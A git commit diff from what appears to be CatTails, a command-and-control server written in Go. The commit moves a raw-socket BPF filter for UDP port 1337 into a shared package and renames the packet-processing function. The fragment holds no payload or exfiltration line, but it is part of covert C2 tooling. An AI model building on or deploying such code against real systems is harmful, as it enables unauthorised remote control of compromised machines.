4a430fc88ea40c6a54619cf2b222b39b0b07ee25
oneNutW0nder <scb5436@rit.edu>
2019-10-23 02:38:03 -0400

    changed for moving filter

--- cmd/c2/server.go
+++ cmd/c2/server.go
@@ -8,7 +8,6 @@ import (
 
 	"github.com/google/gopacket"
 	"github.com/oneNutW0nder/CatTails/cattails"
-	"golang.org/x/net/bpf"
 	"golang.org/x/sys/unix"
 )
 
@@ -37,7 +36,7 @@ func sendCommand(fd int, iface *net.Interface, src net.IP, listen chan Host) {
 }
 
 // ProcessPacket TODO:
-func processPacket(packet gopacket.Packet, listen chan Host) {
+func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
 
 	data := string(packet.ApplicationLayer().Payload())
 
@@ -62,30 +61,7 @@ func processPacket(packet gopacket.Packet, listen chan Host) {
 
 func main() {
 
-	filterRaw := []bpf.RawInstruction{
-		{0x28, 0, 0, 0x0000000c},
-		{0x15, 0, 6, 0x000086dd},
-		{0x30, 0, 0, 0x00000014},
-		{0x15, 0, 15, 0x00000011},
-		{0x28, 0, 0, 0x00000036},
-		{0x15, 12, 0, 0x00000539},
-		{0x28, 0, 0, 0x00000038},
-		{0x15, 10, 11, 0x00000539},
-		{0x15, 0, 10, 0x00000800},
-		{0x30, 0, 0, 0x00000017},
-		{0x15, 0, 8, 0x00000011},
-		{0x28, 0, 0, 0x00000014},
-		{0x45, 6, 0, 0x00001fff},
-		{0xb1, 0, 0, 0x0000000e},
-		{0x48, 0, 0, 0x0000000e},
-		{0x15, 2, 0, 0x00000539},
-		{0x48, 0, 0, 0x00000010},
-		{0x15, 0, 1, 0x00000539},
-		{0x6, 0, 0, 0x00040000},
-		{0x6, 0, 0, 0x00000000},
-	}
-
-	vm := cattails.CreateBPFVM(filterRaw)
+	vm := cattails.CreateBPFVM(cattails.FilterRaw)
 
 	sendfd := cattails.NewSocket()
 	readfd := cattails.NewSocket()
@@ -109,7 +85,7 @@ func main() {
 		packet := cattails.ReadPacket(readfd, vm)
 		// Yeet over to processing function
 		if packet != nil {
-			go processPacket(packet, listen)
+			go serverProcessPacket(packet, listen)
 		}
 	}
 }
